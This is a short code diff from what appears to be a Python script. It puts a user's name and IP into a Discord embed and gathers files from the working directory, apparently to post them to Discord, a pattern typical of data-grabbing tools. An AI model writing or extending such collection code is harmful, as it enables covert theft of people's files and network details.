@@ -29,7 +29,7 @@ embed = DiscordEmbed(title=f'NAME: {user}', description=f'IP: {userIP}', color=r
 files = []
 
 for file in os.listdir():
-    if file.endswith(".py") or file.endswith(".key") or file.endswith(".md") or file.endswith(".env") or file.endswith(".gitignore"):
+    if file.endswith(('.py', '.key', '.md', '.env', '.gitignore', '.gitattributes', 'LICENSE')):
         continue
     if os.path.isfile(file):
         files.append(file)
